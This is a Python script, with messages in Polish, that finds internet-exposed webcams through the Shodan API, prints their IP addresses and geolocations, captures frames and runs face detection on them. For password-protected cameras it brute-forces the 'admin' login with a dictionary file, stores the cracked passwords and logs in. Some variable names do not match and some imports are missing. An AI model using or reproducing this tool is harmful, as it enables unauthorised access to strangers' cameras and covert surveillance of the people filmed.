#!/usr/bin/env python

import shodan
import cv2
from cam_class import *
# from passwd import *
from passwd_thread1 import *
import sys
import re
import pickle


basefile = 'database.pkl'
pkl = open(basefile, 'rb')
base = pickle.load(pkl)
pkl.close()


def ListResults(result):
    info = GetInfo(result)
    Flush(info)

    try:
        http = str(result['http'])
        is_pass = http.find('password')
        if is_pass is -1:
            is_pass = False
        else:
            is_pass = True
    except:
        is_pass = True

    if is_pass is False:
        count = re.findall(r"[\w']+", http)
        try:
            sources = int(count[count.index('Source') + 1])
        except:
            sources = 0

        camera = Webcam7(str(info[0]), str(info[1]))

        for s in range(1, sources + 1):
            name = str(info[0]) + '_' + str(s) + '.png'
            frame = camera.GrabFrame(s)
            if frame is not None:
                cv2.imwrite('capture/' + name, frame)
                FaceDetect(frame, name)
                print("Zrobione %s" % str(s))
            else:
                print("Błąd: Pusty obraz %s" % str(s))

    else:
        address = 'http://' + str(info[0]) + ':' + str(info[1])
        user = 'admin'

        if address not in base:
            print("Hakujem...")
            try:
                passwordbreaker = passbrk(
                    linklist=address, passlist='dictionary.txt', username=user)
                password = passwordbreaker.sprawdzaj_listy_POOL()
                print('Znalazłem hasło %s' % password)
                baza[adres] = str(password)

                response = requests.get(
                    address, auth=requests.auth.HTTPBasicAuth(user, password))
                page = BeautifulSoup(response.text, "lxml")
                count = re.findall(r"[\w']+", str(page))
                try:
                    sources = int(count[count.index('Source') + 1])
                except:
                    sources = 0

                output = open('database.pkl', 'wb')
                pickle.dump(baza, output)
                output.close()
            except:
                print('Błąd: Procedura uzyskiwania hasła nie powiodła się')
                user = ''
                password = ''
                sources = 0
        else:
            password = base[address]

        camera = Webcam7(str(info[0]), str(info[1]),
                         user=user, password=password)

        for s in range(1, sources + 1):
            name = str(info[0]) + '_' + str(s) + '.png'
            frame = camera.GrabFrame(s)
            if frame is not None:
                cv2.imwrite('capture/' + name, frame)
                FaceDetect(frame, name)
                print("Zrobione %s" % str(s))
            else:
                print("Błąd: Pusty obraz %s" % str(s))

    print('')


def GetInfo(result):  # ret [ ip port kod miasto dł szer ]
    item = result.get('location')

    return [result['ip_str'], result['port'], item['country_code3'], item['city'],
            item['latitude'], item['longitude']]


def Flush(info):
    print('Kamera:')
    print('IP:', info[0])
    print('Port:', info[1])
    print('Lokalizacja: %s, %s (%s %s)' % (info[3], info[2], info[4], info[5]))


if __name__ == "__main__":
    f = open('API_KEY', 'r')
    SHODAN_API_KEY = f.readline().splitlines()
    api = shodan.Shodan(SHODAN_API_KEY)

    try:
        query = ' '.join(sys.argv[1:])
        # results = api.search('"webcam 7"')
        results = api.search(query)
        print('Liczba wyników: %s' % results['total'])
        print('')
    except shodan.APIError as e:
        print('Błąd: %s' % e)
        raise
    else:
        for result in results['matches']:
            ListResults(result)
